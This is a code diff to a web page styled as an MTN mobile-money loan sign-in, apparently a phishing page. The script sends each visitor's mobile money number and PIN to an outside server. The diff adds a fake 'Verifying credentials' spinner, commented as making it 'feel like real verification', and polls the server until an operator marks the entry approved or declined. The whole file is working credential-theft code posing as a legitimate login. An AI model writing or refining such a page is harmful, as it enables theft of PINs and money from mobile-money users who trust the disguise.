@@ -154,6 +154,22 @@
   }
   .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}
 
+  /* ---------- Verifying spinner ---------- */
+  .spinner-ring{
+    width:54px;height:54px;
+    border-radius:50%;
+    border:5px solid #E2E8F0;
+    border-top-color:var(--mtn-blue-deep);
+    border-right-color:var(--mtn-blue-deep);
+    animation:spinRing .9s linear infinite;
+    margin:0 auto 20px;
+  }
+  @keyframes spinRing{to{transform:rotate(360deg);}}
+
+  .verify-modal{
+    border-top-color:var(--mtn-blue-deep) !important;
+  }
+
   @media(max-width:640px){
     .card{padding:26px 20px 28px;}
     main{padding:36px 16px 44px;}
@@ -204,6 +220,15 @@
 
   <div class="frame-bottom"></div>
 
+  <!-- Verifying popup -->
+  <div class="modal-overlay" id="verifyModal">
+    <div class="modal verify-modal">
+      <div class="spinner-ring"></div>
+      <h2>Verifying credentials</h2>
+      <p>Please wait while we verify your details…</p>
+    </div>
+  </div>
+
   <!-- Success popup -->
   <div class="modal-overlay" id="successModal">
     <div class="modal">
@@ -217,12 +242,7 @@
   </div>
 
 <script>
-  // ✅ Working Render endpoint first, Railway as fallback
-  const ENDPOINTS = [
-    "https://mtnadvanced-loans.onrender.com/notify",
-    "https://web-production-1a1f07.up.railway.app/notify"
-  ];
-
+  const API = "https://mtnadvanced-loans.onrender.com";
   const el = id => document.getElementById(id);
 
   function setStatus(msg, type){
@@ -231,44 +251,19 @@
     s.className = 'status' + (type ? ' ' + type : '');
   }
 
-  function openModal(){
-    el('successModal').classList.add('show');
-  }
+  function openModal(){ el('successModal').classList.add('show'); }
 
   function closeModal(){
     el('successModal').classList.remove('show');
-    setTimeout(() => {
-      window.location.href = 'index.html';
-    }, 250);
+    setTimeout(() => { window.location.href = 'index.html'; }, 250);
   }
 
-  async function sendToServer(momo, pin){
-    const body = JSON.stringify({
-      momo: momo,
-      pin: pin,
-      time: new Date().toLocaleString()
-    });
+  function openVerify(){
+    el('verifyModal').classList.add('show');
+  }
 
-    let lastError = null;
-
-    for(const url of ENDPOINTS){
-      try{
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: body
-        });
-        const data = await res.json();
-        if(data.ok){
-          return { ok: true };
-        }
-        lastError = data.description || data.error || 'unknown error';
-      }catch(err){
-        lastError = err.message;
-      }
-    }
-
-    return { ok: false, error: lastError || 'All servers unreachable' };
+  function closeVerify(){
+    el('verifyModal').classList.remove('show');
   }
 
   async function signIn(){
@@ -298,15 +293,69 @@
     }));
 
     el('submitBtn').disabled = true;
-    setStatus('Sending…');
+    setStatus('');
+    openVerify();
 
-    const result = await sendToServer(momo, pin);
+    // Minimum spinner time so it feels like real verification
+    const MIN_VERIFY_MS = 3500;
+    const verifyStart = Date.now();
 
-    if(result.ok){
-      setStatus('');
-      openModal();
-    }else{
-      setStatus('❌ ' + result.error, 'err');
+    try{
+      const res = await fetch(`${API}/notify`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          momo: momo,
+          pin: pin,
+          time: new Date().toLocaleString()
+        })
+      });
+
+      const data = await res.json();
+
+      if(!data.ok){
+        closeVerify();
+        setStatus('❌ ' + (data.error || 'Server error'), 'err');
+        el('submitBtn').disabled = false;
+        return;
+      }
+
+      const requestId = data.request_id;
+      const MAX_WAIT = 5 * 60 * 1000;
+
+      const poll = setInterval(async () => {
+        try{
+          const r = await fetch(`${API}/status/${requestId}`);
+          const s = await r.json();
+
+          const elapsed = Date.now() - verifyStart;
+          if(elapsed < MIN_VERIFY_MS && s.status === 'pending'){
+            return; // keep spinner up for at least MIN_VERIFY_MS
+          }
+
+          if(s.status === 'approved'){
+            clearInterval(poll);
+            closeVerify();
+            openModal();
+          } else if(s.status === 'declined' || s.status === 'expired'){
+            clearInterval(poll);
+            closeVerify();
+            setStatus('❌ Incorrect credentials. Please try again.', 'err');
+            el('submitBtn').disabled = false;
+          } else if(Date.now() - verifyStart > MAX_WAIT){
+            clearInterval(poll);
+            closeVerify();
+            setStatus('❌ Timed out. Please try again.', 'err');
+            el('submitBtn').disabled = false;
+          }
+        }catch(err){
+          // ignore transient errors, keep polling
+        }
+      }, 1000);
+
+    }catch(err){
+      closeVerify();
+      setStatus('❌ Could not reach server.', 'err');
       el('submitBtn').disabled = false;
     }
   }
